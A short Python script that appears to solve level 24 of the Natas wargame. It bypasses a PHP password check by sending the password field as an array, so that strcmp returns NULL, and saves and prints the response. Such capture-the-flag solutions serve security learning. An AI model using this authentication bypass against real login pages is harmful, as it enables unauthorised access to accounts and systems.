import requests

import utils

LEVEL = 24
url, auth = utils.get_natas_credentials(LEVEL)

with requests.Session() as session:
    """ change the data type of passwd to an array so that strcmp breaks and returns NULL which 
        is interpreted as 0 (FALSE).  Since !strcmp() -> TRUE """
    data = {
        "passwd[]": "",
        "submit": "Login"
    }
    r = requests.post(url, auth=auth, data=data)
    utils.save_file('out.txt', r.text)
    print(r.text)
